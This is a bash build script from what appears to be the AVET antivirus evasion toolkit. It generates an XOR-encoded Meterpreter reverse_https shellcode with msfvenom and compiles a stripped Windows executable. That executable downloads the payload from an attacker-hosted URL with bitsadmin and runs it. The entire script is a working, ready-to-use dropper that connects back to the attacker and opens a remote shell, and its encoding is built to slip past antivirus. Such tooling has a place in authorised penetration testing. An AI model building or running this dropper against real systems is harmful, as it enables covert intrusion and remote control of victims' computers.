#!/bin/bash 
# Downloads and executes 64-bit shellcode, using bitsadmin. Applies metasploit XOR encoding.

# The generated msf shellcode file needs to be hosted on a HTTP server
# Call the executable like:
# output.exe http://yourserver/thepayload.bin
# Downloads the payload to disk, then reads the file and executes the payload.

# print AVET logo
cat banner.txt

# include script containing the compiler var $win64_compiler
# you can edit the compiler in build/global_win64.sh
# or enter $win64_compiler="mycompiler" here
. build/global_win64.sh

# import feature construction interface
. build/feature_construction.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh

# override connect-back settings here, if necessary
LPORT=$GLOBAL_LPORT
LHOST=$GLOBAL_LHOST

# make meterpreter reverse payload
msfvenom -p windows/x64/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x64/xor -b '\x00' -f raw --platform Windows > output/thepayload.bin

# no command preexec
set_command_source none
set_command_exec none

# set shellcode source
set_payload_source download_bitsadmin

# set decoder and key source
set_decoder none
set_key_source none

# set payload info source
set_payload_info_source none

# set shellcode binding technique
set_payload_execution_method exec_shellcode64

# enable debug output
enable_debug_print to_file C:/users/public/avetdbg.txt

# compile
$win64_compiler -o output/output.exe source/avet.c -lwsock32 -lWs2_32
strip output/output.exe

# cleanup
cleanup_techniques


# The generated msf shellcode file needs to be hosted on a HTTP server
# Call the executable like:
# output.exe http://yourserver/thepayload.bin
# Downloads the payload to disk, then reads the file and executes the payload.
